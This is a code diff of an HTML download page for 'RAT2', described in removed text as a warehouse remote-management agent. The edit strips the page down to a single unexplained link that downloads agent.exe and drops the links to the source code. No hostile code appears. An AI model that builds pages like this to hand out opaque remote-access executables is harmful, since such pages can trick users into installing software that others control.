@@ -3,76 +3,29 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>RAT2 - Remote Agent</title>
+<title>RAT2</title>
 <style>
-  :root {
-    --bg:     #0d1117;
-    --panel:  #161b22;
-    --border: #30363d;
-    --accent: #58a6ff;
-    --text:   #e6edf3;
-    --muted:  #8b949e;
-  }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: var(--bg);
-    color: var(--text);
-    font: 15px/1.6 'Segoe UI', system-ui, sans-serif;
+    background: #0d1117;
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 40px 20px;
   }
-  .card {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 48px;
-    max-width: 520px;
-    width: 100%;
-    text-align: center;
-  }
-  .logo { font-size: 44px; font-weight: 800; letter-spacing: .06em; color: var(--accent); margin-bottom: 8px; }
-  .tagline { color: var(--muted); font-size: 14px; margin-bottom: 44px; }
-  .primary-btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 10px;
-    background: var(--accent);
+  a {
+    background: #58a6ff;
     color: #000;
-    font-weight: 700;
-    font-size: 17px;
-    padding: 15px 44px;
+    font: 700 17px/1 'Segoe UI', system-ui, sans-serif;
+    padding: 16px 44px;
     border-radius: 10px;
     text-decoration: none;
     transition: opacity .15s;
-    margin-bottom: 12px;
   }
-  .primary-btn:hover { opacity: .85; }
-  .sub-note { color: var(--muted); font-size: 13px; margin-bottom: 44px; }
-.divider { border: none; border-top: 1px solid var(--border); margin: 0 0 20px; }
-  .alt-link { font-size: 13px; color: var(--muted); }
-  .alt-link a { color: var(--muted); text-decoration: underline; }
-  .alt-link a:hover { color: var(--text); }
+  a:hover { opacity: .85; }
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">RAT2</div>
-  <div class="tagline">Warehouse Remote Management &mdash; Agent</div>
-
-  <a class="primary-btn" href="/agent.exe" download="agent.exe">
-    &#8595;&nbsp; Download agent.exe
-  </a>
-  <div class="sub-note">Windows &bull; No installation &bull; No setup</div>
-
-  <hr class="divider">
-  <div class="alt-link">
-    <a href="/rat2.py" download="rat2.py">Python source</a>
-    &nbsp;&bull;&nbsp;
-    <a href="https://github.com/ITZV0LT/rat2" target="_blank" rel="noopener">GitHub</a>
-  </div>
-</div>
+  <a href="/agent.exe" download="agent.exe">agent.exe</a>
 </body>
 </html>
